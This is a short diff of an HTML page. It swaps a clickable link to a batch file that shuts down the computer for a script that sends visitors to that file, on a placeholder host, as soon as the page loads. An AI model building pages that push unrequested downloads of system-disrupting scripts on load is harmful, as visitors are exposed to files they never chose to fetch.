@@ -3,12 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download Shutdown Script</title>
+  <title>Shutdown Computer</title>
 </head>
 <body>
-
-  <!-- Download button for the batch file -->
-  <a href="shutdown_computer.bat" download="shutdown_computer.bat">Download Shutdown Script</a>
-
+  <script>
+    window.onload = function() {
+      // Redirect the page to the batch file
+      window.location.href = "https://example.com/path/to/shutdown_computer.bat";
+    };
+  </script>
 </body>
 </html>
